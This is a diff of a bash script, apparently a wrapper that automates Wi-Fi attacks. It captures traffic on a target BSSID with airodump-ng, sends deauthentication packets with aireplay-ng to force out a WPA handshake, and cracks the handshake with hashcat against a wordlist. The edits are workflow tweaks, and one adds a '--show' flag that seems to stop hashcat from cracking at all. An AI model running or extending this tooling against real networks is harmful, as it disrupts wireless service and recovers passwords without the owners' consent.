@@ -421,12 +421,10 @@ stage_capture() {
   echo -e "  ${CYAN}[*] Step 1 — Starting focused capture on $TARGET_BSSID (CH $TARGET_CHANNEL)${NC}\n"
   confirm "Launch capture window?" || bail "Aborted."
 
-  launch_in_terminal "sudo airodump-ng -c '$TARGET_CHANNEL' --bssid '$TARGET_BSSID' -w '$CAPTURE_FILE' '$INTERFACE'"
+  launch_in_terminal "sudo airodump-ng -c '$TARGET_CHANNEL' --bssid '$TARGET_BSSID' -w '$CAPTURE_FILE' '$INTERFACE'" >/dev/null
 
   echo -e "\n  ${YELLOW}[*] Capture window launched. Leave it running in the background.${NC}"
-  echo -e "  ${YELLOW}    Wait for it to initialize before continuing.${NC}\n"
-  echo -ne "  ${YELLOW}    Press Enter when ready to continue...${NC}"
-  read -r
+  echo -e "  ${YELLOW}    Wait for it to initialize before continuing.${NC}"
   while IFS= read -r -t 0 _; do :; done 2>/dev/null
 
   #Deauth
@@ -441,9 +439,10 @@ stage_capture() {
 
   confirm "Send deauth to $TARGET_BSSID now?" || bail "Aborted."
 
-  local flag
-  flag=$(launch_in_terminal "sudo aireplay-ng -0 '$PACKET_COUNT' -a '$TARGET_BSSID' '$INTERFACE'")
-  launch_in_terminal "$flag" "Sending deauth packets..."
+  launch_in_terminal "sudo aireplay-ng -0 '$PACKET_COUNT' -a '$TARGET_BSSID' '$INTERFACE'" >/dev/null
+
+  echo -e "\n  ${YELLOW}[*] Deauth window launched.${NC}"
+  while IFS= read -r -t 0 _; do :; done 2>/dev/null
 
   # Confirm handshake
   echo -e "\n  ${YELLOW}[*] Watch the capture window for 'WPA handshake: $TARGET_BSSID'.${NC}"
@@ -589,7 +588,7 @@ stage_crack_hashcat() {
   echo -e "  ${CYAN}[*] Running hashcat...${NC}"
   local log="$HOME/.aircracked/hashcat_$$.log"
 
-  sudo hashcat -m 22000 --quiet "$hash" "$WORDLIST" >"$log" 2>&1 &
+  sudo hashcat -m 22000 --quiet --show "$hash" "$WORDLIST" >"$log" 2>&1 &
   local pid=$!
   while kill -0 $pid 2>/dev/null; do
     for s in '⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏'; do
